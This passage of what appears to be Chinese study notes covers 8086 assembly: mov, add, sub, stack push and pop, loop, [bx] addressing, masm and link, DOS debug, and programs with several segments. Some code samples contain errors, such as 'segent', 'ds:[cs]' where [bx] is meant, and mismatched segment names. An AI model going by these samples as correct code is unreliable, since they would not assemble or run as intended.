/>\n<p>2c34</p>\n<p>1B12   -d 1000:0</p>\n<p>0000</p>\n<p>mov 指令</p>\n<blockquote>\n<p>mov 寄存器，数据</p>\n<p>mov 寄存器，寄存器</p>\n<p>mov 寄存器，内存单元   mov ax,[0]</p>\n<p>mov 内存单元，客存器   mov [0],ax</p>\n<p>mov 段寄存器，寄存器</p>\n<p>mov 寄存器，段寄存器</p>\n</blockquote>\n<p>add，sub</p>\n<blockquote>\n<p>add 寄存器，数据</p>\n<p>add 寄存器，寄存器</p>\n<p>add 寄存器，内存单元</p>\n<p>add 内存单元，寄存器</p>\n<p>sub 寄存器，数据</p>\n<p>sub 寄存器，寄存器</p>\n<p>sub 寄存器，内存单元</p>\n<p>sub 内存单元，寄存器</p>\n</blockquote>\n<p>add,sub 不能使用段寄存器为参数</p>\n<p>数据段：长度为 N 的地址连续，起始地址为 16 倍数的内存单元定义为存储数据的内存空间</p>\n<p>将 123B0-123BA 的前三个单元的字节型数据累加</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221012212730685.png\" alt=\"image-20221012212730685\" style=\"zoom:50%;\" />\n<p>累加字型数据</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221012213223456.png\" alt=\"image-20221012213223456\" style=\"zoom:50%;\" />\n<p>[address] 表示一个偏移地址为 address 的内存单元</p>\n<p><img data-src=\"../AppData/Roaming/Typora/typora-user-images/image-20221012214721228.png\" alt=\"image-20221012214721228\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221012214843733.png\" alt=\"image-20221012214843733\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221012215020183.png\" alt=\"image-20221012215020183\"></p>\n<p>即 [0] 073F 和 073F [0] 会将 073f 当做偏移地址，验证：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221012215201456.png\" alt=\"image-20221012215201456\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221012215301128.png\" alt=\"image-20221012215301128\"></p>\n<h4 id=\"栈\"><a class=\"markdownIt-Anchor\" href=\"#栈\">#</a> 栈</h4>\n<p>8086 提供的入栈和出栈 push,pop</p>\n<p>push ax 将寄存器 ax 中的数据送入栈中</p>\n<p>pop ax 从栈顶取出数据送入 ax</p>\n<p>通过段寄存器 SS 存放栈顶的段地址，sp 存放栈顶偏移地址，任意时刻，SS:SP 指向栈顶元素</p>\n<p>push ax sp=sp-2,SS:SP 指向新栈顶，放入数据</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221013193051835.png\" alt=\"image-20221013193051835\" style=\"zoom:50%;\" />\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221013193356305.png\" alt=\"image-20221013193356305\" style=\"zoom:50%;\" />\n<blockquote>\n<p>任意时刻・SS:SP 指向栈顶元素。当栈为空的时候，栈中没有元素，也就不存在栈项元素<br>\n所 SS:SP 只能指向栈的最底部单元下面的单元，该单元的偏移地址为栈最底部的字单元的偏移地址 + 2<br>\n 栈最底部字单元的地址为 1000:000E，所以栈空时 SP=0010H</p>\n</blockquote>\n<p>pop ax  将数据送入 ax 中，SP=SP+2，数据仍在内存中，下一次 push 或其他写入数据的操作时会覆盖</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221013194330665.png\" alt=\"image-20221013194330665\" style=\"zoom:50%;\" />\n<p>push 和 pop 可以操作段寄存器，通用寄存器，内存单元</p>\n<p>push ax</p>\n<p>push ds</p>\n<p>push [0]</p>\n<h4 id=\"栈顶越界\"><a class=\"markdownIt-Anchor\" href=\"#栈顶越界\">#</a> 栈顶越界</h4>\n<p>栈满 push，栈空 pop 产生越界</p>\n<p>栈满 push 会导致溢出覆盖栈外的数据</p>\n<p>栈空 pop 会将别的数据放入寄存器中产生溢出</p>\n<p>8086CPU 中没有检测的机制，需要自己注意…</p>\n<h4 id=\"练习\"><a class=\"markdownIt-Anchor\" href=\"#练习\">#</a> 练习</h4>\n<p>将 10000H~1000FH 这段空间当作栈，初始状态是空的，将 AX,BX,DS 中的数据入栈</p>\n<p>mov ax,1000</p>\n<p>mov ss,ax</p>\n<p>mov sp,0010</p>\n<p>push ax</p>\n<p>push bx</p>\n<p>push ds</p>\n<p>(1）将 10000H~1000FH 这段空间当作栈，初始状态是空的；</p>\n<p>(2）设置 AX=001AH，BX=001BH;</p>\n<p>(3）将 AX，BX 中的数据入栈</p>\n<p>(4）然后将 AX，BX 清零；</p>\n<p>(5）从栈中恢复 AX，BX 原来的内容。</p>\n<p>mov ax,1000</p>\n<p>mov ss,ax</p>\n<p>mov sp,0010</p>\n<p>mov ax,001A</p>\n<p>mov bx,001B</p>\n<p>push ax</p>\n<p>push bx</p>\n<p>mov ax,0   // 使用 sub ax,ax 只使用两个字节，mov ax,0 机器码需要三个字节，也可以使用 xor ax,ax</p>\n<p>mov bx,0</p>\n<p>pop bx</p>\n<p>pop ax</p>\n<p>(1)   将 10000H~1000FH 这段空间当栈，初始状态是空的；</p>\n<p>(2）设置 AX=002AH ，BX=002BH;</p>\n<p>(3）利用栈交换 AX 和 BX 中的数据。</p>\n<p>mov ax,1000</p>\n<p>mov ss,ax</p>\n<p>mov sp,0010</p>\n<p>mov ax,002A</p>\n<p>mov bx,002B</p>\n<p>push ax</p>\n<p>push bx</p>\n<p>pop ax</p>\n<p>pop bx</p>\n<p>我们如果要在 10000H 处写入字型数据 2266H, 可以用以下的代码完成︰</p>\n<p>mov ax,1000H</p>\n<p>mov ds,ax</p>\n<p>mov ax,2266H</p>\n<p>mov [0],ax</p>\n<p>补在 10000H 处写入字型数据 2266H</p>\n<p>mov ax,1000</p>\n<p>mov ss,ax</p>\n<p>mov sp,2   //push 之前先 - 2，在放输入，2-2=0</p>\n<p>mov ax,2266</p>\n<p>push ax</p>\n<p>要求，不能用 mov 内存单元，寄存器这类指令</p>\n<p>push，pop 实质上是一种内存传送指令，push，pop 访问的内存单元的地址是由 ss:sp 指出的</p>\n<p>pop，pop 栈操作只修改 sp，sp 最大变化范围为 0-FFFF</p>\n<p>如果我们将 10000H~1FFFFH 这段空间当作栈段，初始状态是空的，比时 SS=1000H，SP=0</p>\n<p>栈顶变化范围为 0-FFFFH，栈空 sp=0，一直压栈，栈满后 sp=0，再次压栈，栈顶将环绕，覆盖原来内容</p>\n<p>对于代码段，数据段，栈段，cpu 通过 CS DS SS 区分</p>\n<p>CS:IP</p>\n<p>SS:SP</p>\n<p>DS:[0]</p>\n<h2 id=\"程序编写\"><a class=\"markdownIt-Anchor\" href=\"#程序编写\">#</a> 程序编写</h2>\n<p>1. 编写汇编程序，后缀为.asm</p>\n<p>2. 编译 masm.exe 连接 link.exe</p>\n<p>3. 执行可执行文件，有程序和数据两部分，操作系统加可执行文件中的机器码和数据加载入内存，进行初始化</p>\n<p>源程序</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221015201813041.png\" alt=\"image-20221015201813041\" style=\"zoom:50%;\" />\n<p>汇编指令上图中 mov，add，int 等</p>\n<p>伪指令上图中 assume codesg，没有对应的机器码，不被 cpu 执行，被编译器执行</p>\n<p>定义一个段</p>\n<p>segment 和 ends 是一对成对的伪指令，定义一个段 segment 开始，ends 结束</p>\n<p>格式:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">段名 segment </span><br><span class=\"line\">段名 ends</span><br></pre></td></tr></table></figure>\n<p>一个汇编程序由多个段组成</p>\n<p>ends 是汇编程序结束标记</p>\n<p>assume 假设寄存器和段关联，CS:codesg，假设代码段的名称为 codesg</p>\n<p>将源程序文件中内容称为源程序，编译后称为程序，程序放在可执行文件中 PE</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221015203100625.png\" alt=\"image-20221015203100625\" style=\"zoom:50%;\" />\n<p>标号 一个标号指代一个地址，codesg</p>\n<p>编程运算 2^3</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">assume cs:abc</span><br><span class=\"line\">abc segent</span><br><span class=\"line\">mov ax,2</span><br><span class=\"line\">add ax,ax</span><br><span class=\"line\">add ax,ax</span><br><span class=\"line\">abc ends</span><br><span class=\"line\">end</span><br></pre></td></tr></table></figure>\n<p>DOS 是一个单任务操作系统，一个程序结束后，将 CPU 控制权交还给使他运行的程序，称为返回</p>\n<p>返回 程序段</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov ax,4c00H</span><br><span class=\"line\">int 21H</span><br></pre></td></tr></table></figure>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221015204512894.png\" alt=\"image-20221015204512894\" style=\"zoom:50%;\" />\n<p>masm.exe 1.asm</p>\n<p>link 1.obj</p>\n<p>可以在命令后加上；简化编译和连接</p>\n<p>连接：源程序很大时将他分为多个源程序编译，成文目标文件后在连接到一起。将库文件和程序的目标文件连接在一起才可以生成可执行文件</p>\n<p>在 DOS 中运行 1.exe 时，DOS 的 command 将 1.exe 加载进入内存，command 设置 CPU 的 cs:IP 指向程序的第一条指令，从而得以使程序运行。</p>\n<p>程序运行结束后，返回到 command 中，cpu 继续执行 command</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221016204217510.png\" alt=\"image-20221016204217510\" style=\"zoom:67%;\" />\n<p>Debug 将程序加载进入内存，当不放弃对 cpu 控制，使用中断实现</p>\n<p>有入口的程序</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">assume cs:codesg</span><br><span class=\"line\">    codesg segment</span><br><span class=\"line\">    start:\tmov ax,0123H</span><br><span class=\"line\">    \t\tadd bx,0456H</span><br><span class=\"line\">    \t\tadd ax,bx</span><br><span class=\"line\">    \t\tadd ax,ax</span><br><span class=\"line\">\t\t\t</span><br><span class=\"line\">\t\t\tmov ax,4c00H</span><br><span class=\"line\">\t\t\tint 21H</span><br><span class=\"line\">    \t\t</span><br><span class=\"line\">codesg ends</span><br><span class=\"line\">end start</span><br></pre></td></tr></table></figure>\n<p>debug 将程序 exe 加载入内存后 cx，存放程序长度</p>\n<p>程序加载后，ds 中放着程序所在内存区的段地址，这个内存区的偏移地址为 0，这个内存区的前 256 个字节存放的是 psp，dos 用来和程序进行通信，从 256 字节以后存放的是程序</p>\n<p>psp 的段地址 SA，偏移地址为 0，表示为 SA+10:0</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221016211036041.png\" alt=\"image-20221016211036041\" style=\"zoom:50%;\" />\n<p>指定到 int 21 时用 p 执行，此时程序 terminated</p>\n<p>使用 q 结束 debug，回到 command 中，因为 debug 由 command 加载</p>\n<h2 id=\"bxloop\"><a class=\"markdownIt-Anchor\" href=\"#bxloop\">#</a> [bx]&amp;loop</h2>\n<p>bx:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">assume cs:codesg</span><br><span class=\"line\">    codesg segment</span><br><span class=\"line\">    start:\tmov ax,2000</span><br><span class=\"line\">    \t\tmov ds,ax</span><br><span class=\"line\">    \t\tmov al,[0]</span><br><span class=\"line\">    \t\tmov bl,[1]</span><br><span class=\"line\">    \t\tmov cl,[2]</span><br><span class=\"line\">    \t\tmov dl,[3]</span><br><span class=\"line\">\t\t\t</span><br><span class=\"line\">\t\t\tmov ax,4c00H</span><br><span class=\"line\">\t\t\tint 21H</span><br><span class=\"line\">    \t\t</span><br><span class=\"line\">codesg ends</span><br><span class=\"line\">end start</span><br></pre></td></tr></table></figure>\n<p>实际来说，CPU 并不认编译器的 [0] 这种东西，他会认成 0</p>\n<p>但 debug 中 [0] 可以正常作为偏移地址</p>\n<p>[bx] 表示一个内存单元，偏移地址在 bx 中</p>\n<p>mov bx,0   // 将 0 给 bx</p>\n<p>mov ax,[bx]   // 此时 bx 是偏移地址</p>\n<p>段地址 SA，偏移地址 EA  SA：EA</p>\n<p>() 的含义</p>\n<p>ax 中的内容为 0010，那么 (ax)=0010</p>\n<p>2000:1000 处的内容为 0010，(21000H)=0010</p>\n<p>mov ax,[2] (ax)=((dx)*16+2)</p>\n<p>idata 含义：</p>\n<p>idata 表示常量</p>\n<p>mov ax,[idata] 代表 Mov ax,[0]  Mov ax,[2]  Mov ax,[3]  d = 等</p>\n<p>inc bx    //bx++</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221017094727684.png\" alt=\"image-20221017094727684\" style=\"zoom:67%;\" />\n<p>ax 00be</p>\n<p>bx 1002</p>\n<p>内存中 00be 00be</p>\n<p>bx 1004</p>\n<p>内存中 00be 00be 00be</p>\n<p>内存中从左到右为从低到高</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221017094440863.png\" alt=\"image-20221017094440863\"></p>\n<p>内存中 00be 00be 00be be 00</p>\n<p>Loop</p>\n<p>loop 标号</p>\n<p>执行 loop 时 CPU 操作</p>\n<p>1.(cx)=(cx)-1</p>\n<p>2. 判断 cx 中的值，不为 0 跳至标号处执行，为 0 向下执行</p>\n<p>即一般 cx 中存放循环次数</p>\n<p>使用 loop 计算 2^2</p>\n<p>mov ax,2</p>\n<p>add ax,ax</p>\n<p>计算 2^12</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">assume cs:code</span><br><span class=\"line\">code segment</span><br><span class=\"line\">start:\tmov ax,2</span><br><span class=\"line\">\t\tmov cx,11</span><br><span class=\"line\">s: \t\tadd ax,ax</span><br><span class=\"line\">\t\tloop s</span><br><span class=\"line\">\t</span><br><span class=\"line\">        mov ax,4c00h</span><br><span class=\"line\">        int 21h</span><br><span class=\"line\">\t</span><br><span class=\"line\">code ends</span><br><span class=\"line\">end start</span><br></pre></td></tr></table></figure>\n<p>注意：debug 默认 16 进制，masm 默认十进制</p>\n<p>loop 相当于 do … while …</p>\n<p>计算 123*236 时使用 236+123 次，减少循环次数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">assume cs:code</span><br><span class=\"line\">code segment</span><br><span class=\"line\">start:\tmov ax,0</span><br><span class=\"line\">\t\tmov cx,123</span><br><span class=\"line\">s: \t\tadd ax,236</span><br><span class=\"line\">\t\tloop s</span><br><span class=\"line\">\t</span><br><span class=\"line\">        mov ax,4c00h</span><br><span class=\"line\">        int 21h</span><br><span class=\"line\">\t</span><br><span class=\"line\">code ends</span><br><span class=\"line\">end start</span><br></pre></td></tr></table></figure>\n<p>汇编时数据不能以字母开头，要在前面 + 0</p>\n<p>debug g 命令和 p 命令</p>\n<p>将 ffff:0006 单元中的数据 * 123，结果存在 dx 中</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">assume cs:code</span><br><span class=\"line\">code segment</span><br><span class=\"line\">start:\tmov ax,0ffffh</span><br><span class=\"line\">\t\tmov ds,ax</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tmov bx,6</span><br><span class=\"line\">\t\tmov ax,[bx]</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tmov dx,0</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tmov cx,123</span><br><span class=\"line\">s:\t\tadd dx,ax</span><br><span class=\"line\">\t\tloop s</span><br><span class=\"line\">\t</span><br><span class=\"line\">        mov ax,4c00h</span><br><span class=\"line\">        int 21h</span><br><span class=\"line\">\t</span><br><span class=\"line\">code ends</span><br><span class=\"line\">end start</span><br></pre></td></tr></table></figure>\n<p>g 0014   // 直接执行到 IP 为 0014 的位置</p>\n<p>p 直接执行到循环结束，如果不是 21H 的位置输入</p>\n<p>在程序中</p>\n<p>mov al, ds:[0]    // == mov bx,0  mov al,[bx], == mov al,[0]</p>\n<p>累加 [0]-[b] 的值</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">assume cs:code</span><br><span class=\"line\">code segment</span><br><span class=\"line\">start:\tmov ax,0ffffh</span><br><span class=\"line\">\t\tmov ds,ax</span><br><span class=\"line\">\t\tmov bx,0</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tmov dx,0</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tmov cx,12</span><br><span class=\"line\">s:\t\tmov al,ds:[cs]</span><br><span class=\"line\">\t\tmov ah,0</span><br><span class=\"line\">\t\tadd dx,ax</span><br><span class=\"line\">\t\tinc bx</span><br><span class=\"line\">\t\tloop s</span><br><span class=\"line\"></span><br><span class=\"line\">\t</span><br><span class=\"line\">        mov ax,4c00h</span><br><span class=\"line\">        int 21h</span><br><span class=\"line\">\t</span><br><span class=\"line\">code ends</span><br><span class=\"line\">end start</span><br></pre></td></tr></table></figure>\n<p>段前缀</p>\n<p>mov ax,cs:[0]    //cs 为段前缀</p>\n<p>一般类似或 0:200-0:2ff 不会有数据和指令，是一段安全的空间</p>\n<p>将内存 ffff:0<sub>ffff:b 段元中的数据拷贝到 0:200</sub>0:20b 单元中。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">assume cs:code</span><br><span class=\"line\">code segment</span><br><span class=\"line\">start:\tmov ax,0ffffh</span><br><span class=\"line\">\t\tmov ds,ax  ;ds中是内存ffff:0中的数据</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tmov ax,0020h</span><br><span class=\"line\">\t\tmov es,ax  ;es是内存20:0中的数据</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tmov bx,0   ;bx中为内存偏移值</span><br><span class=\"line\">\t\tmov cx,12  ;为循环判断条件</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">s:\t\tmov dl,ds:[bx]</span><br><span class=\"line\">\t\tmov es:[bx],dl</span><br><span class=\"line\">\t\tinc bx</span><br><span class=\"line\">\t\tloop s</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t</span><br><span class=\"line\">        mov ax,4c00h</span><br><span class=\"line\">        int 21h</span><br><span class=\"line\">\t</span><br><span class=\"line\">code ends</span><br><span class=\"line\">end start</span><br></pre></td></tr></table></figure>\n<h2 id=\"多个段的程序\"><a class=\"markdownIt-Anchor\" href=\"#多个段的程序\">#</a> 多个段的程序</h2>\n<p>我们是不能自己随便决定哪段空间可以使用的，应该让系统来为我们分配。<strong>我们可以在程序中</strong>，定义我们希望处理的数据，这些数据就会被编译、连接程序作为程序的一部分写到可执行文件中。当可执行文件中的程序被加载入内存时，这些数据也同时被加载入内存中。与此同时，我们要处理的数据也就自然而然地获得了存储空间。</p>\n<p>dw define word 定义字型数据，在代码段中定义数据，此时代码 的起始位置是数据之后</p>\n<p>db 定义字节型数据</p>\n<p>数据之间用，分隔</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">assume cs:code</span><br><span class=\"line\">code segment</span><br><span class=\"line\">\t\tdw 0123h,0234h,0123h,0234h,0123h,0234h,0123h,0234h</span><br><span class=\"line\">start:\tmov ax,0ffffh</span><br><span class=\"line\">\t\tmov ds,ax  </span><br></pre></td></tr></table></figure>\n<p>标号 start 定义代码段的开始，区分数据和代码</p>\n<p>-u 13f8:0</p>\n<p>-u 13f8:10</p>\n<p>读取结果不一样，如果数据被读成了代码，会导致下面真正的代码读取错误，因此在 debug 加载后，我们需要将 IP 设置为代码段中数据段的结束，比如上面的代码，我们需要将 IP 定义为 10 (10 进制的 16)</p>\n<p>end start 可以告诉编译器程序的入口，即标号的地方。我们若要 CPU 从何处开始执行程序，只要在源程序中用 “end 标号” 指明就可以了。</p>\n<p>代码段中使用栈</p>\n<p>若数据，栈，代码所需空间查过 64kb，就不能放到一个栈中，因此应该用多个段存放数据，代码和栈</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">assume cs:codesg</span><br><span class=\"line\">codesg segment</span><br><span class=\"line\">\tdw 0123H,0123H,0123H,0123H,0123H,0123H,0123H,0123H</span><br><span class=\"line\">\tdw 0,0,0,0,0,0,0,0  ;将上一行dw的数据入栈和出栈的空间</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t</span><br><span class=\"line\">start:\tmov ax,cs  ;将代码段起始位置给栈段</span><br><span class=\"line\">\t\tmov ss,ax</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tmov sp,32  ;设置栈段的偏移地址为32(0+2*16)+1</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tmov bx,0   ;bx偏移地址</span><br><span class=\"line\">\t\tmov cx,8   ;cx loop条件</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">s:\t\tpush cs:[bx] ;将cs中的数据入栈</span><br><span class=\"line\">\t\tadd bx,2</span><br><span class=\"line\">\t\tloop s</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tmov bx,0</span><br><span class=\"line\">\t\tmov cx,8</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">s0:\t\tpop cs:[bx]  ;将cs中的数据出栈</span><br><span class=\"line\">\t\tadd bx,2</span><br><span class=\"line\">\t\tloop s0</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tmov ax,4c00H</span><br><span class=\"line\">\t\tint 21H</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">codesg ends</span><br><span class=\"line\">end start</span><br></pre></td></tr></table></figure>\n<p>存放数据的 data，存放 stack 栈，cs 存放代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">assume cs:code,ds:data,ss:stack</span><br><span class=\"line\"></span><br><span class=\"line\">data segment</span><br><span class=\"line\">\tdw 0123H,0123H,0123H,0123H,0123H,0123H,0123H,0123H</span><br><span class=\"line\">data ends</span><br><span class=\"line\"></span><br><span class=\"line\">stack segment</span><br><span class=\"line\">\tdw 0,0,0,0,0,0,0,0</span><br><span class=\"line\">stack ends</span><br><span class=\"line\"></span><br><span class=\"line\">code segment</span><br><span class=\"line\">start:\tmov ax,stack</span><br><span class=\"line\">\t\tmov ss,ax</span><br><span class=\"line\">\t\tmov sp,16</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tmov ax,data</span><br><span class=\"line\">\t\tmov ds,ax</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tmov bx,0</span><br><span class=\"line\">\t\tmov cx,8</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">s:\t\tpush [bx] </span><br><span class=\"line\">\t\tadd bx,2</span><br><span class=\"line\">\t\tloop s</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tmov bx,0</span><br><span class=\"line\">\t\tmov cx,8</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">s0:\t\tpop [bx]</span><br><span class=\"line\">\t\tadd bx,2</span><br><span class=\"line\">\t\tloop s0</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tmov ax,4c00H</span><br><span class=\"line\">\t\tint 21H</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">codesg ends</span><br><span class=\"line\">end start</span><br></pre></td></tr></table></figure>\n<p>在程序中，段名就相当于一个标号，它代表了段地址。所以指令 “mov ax,data” 的含义就是将名称为 “data” 的段的段地址送入 ax。</p>\n<p>CPU 处理我们定义的段中的内容，是通过程序中的汇编指令，和汇编指令对 CS:IP,SS:SP，DS 等寄存器的设置来决定</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span 